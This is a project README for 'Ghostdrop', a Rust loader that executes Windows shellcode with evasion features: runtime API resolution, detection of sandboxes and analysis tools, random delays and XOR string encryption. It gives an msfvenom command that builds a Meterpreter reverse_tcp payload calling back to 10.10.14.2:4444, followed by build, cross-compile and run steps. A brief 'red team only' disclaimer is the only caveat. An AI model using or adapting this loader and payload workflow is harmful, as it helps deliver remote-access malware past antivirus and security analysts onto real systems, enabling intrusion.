# Ghostdrop

A Windows shellcode execution tool for red team operations with advanced anti-detection capabilities.

## Features

- Loads and executes raw Windows shellcode
- Supports Meterpreter reverse shell payloads
- Advanced anti-detection mechanisms:
  - Dynamic API resolution
  - Sandbox detection
  - Random sleep delays
  - String encryption
- Test mode for safe execution verification
- Cross-compilation support from Linux to Windows

## Anti-Detection Capabilities

### Dynamic API Resolution
- Resolves Windows API functions at runtime
- Evades static analysis and signature-based detection
- Uses `GetModuleHandleA` and `GetProcAddress` for dynamic loading

### Sandbox Detection
- Checks for common sandbox and analysis tool processes
- Detects popular analysis tools like:
  - Wireshark
  - Process Monitor
  - TCPView
  - Fiddler
  - x64dbg
  - And many more
- Graceful exit if sandbox environment is detected

### Random Sleep/Delay
- Configurable random sleep before execution
- Helps evade sandbox timeouts
- Customizable via command line argument

### String Encryption
- XOR encryption for sensitive strings
- Makes static analysis more difficult
- Protects process names and API strings

## Usage

1. Generate shellcode using msfvenom:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f rust
```

2. Copy the generated shellcode into `src/main.rs`, replacing the placeholder array.

3. Build the project:
```bash
cargo build --release
```

4. Run the program:
```bash
./target/release/ghostdrop.exe
```

### Command Line Options

- `--test` or `-t`: Run in test mode (skips shellcode execution)
- `--sleep` or `-s`: Set maximum sleep time in seconds (default: 5)

Examples:
```bash
# Normal execution with default 5-second random sleep
./ghostdrop.exe

# Test mode (skips execution)
./ghostdrop.exe --test

# Custom sleep time (e.g., 10 seconds)
./ghostdrop.exe --sleep 10
```

## Cross-compilation from Linux to Windows

1. Install the Windows target:
```bash
rustup target add x86_64-pc-windows-msvc
```

2. Build for Windows:
```bash
cargo build --release --target x86_64-pc-windows-msvc
```

The compiled binary will be in `target/x86_64-pc-windows-msvc/release/ghostdrop.exe`

## Security Notice

This tool is intended for red team operations and penetration testing only. Use responsibly and in accordance with applicable laws and regulations.

## Dependencies

- winapi: Windows API bindings
- clap: Command line argument parsing
- rand: Random number generation
- aes: Encryption support
- block-modes: Block cipher modes
- hex: Hexadecimal encoding/decoding
- windows-sys: Additional Windows API bindings 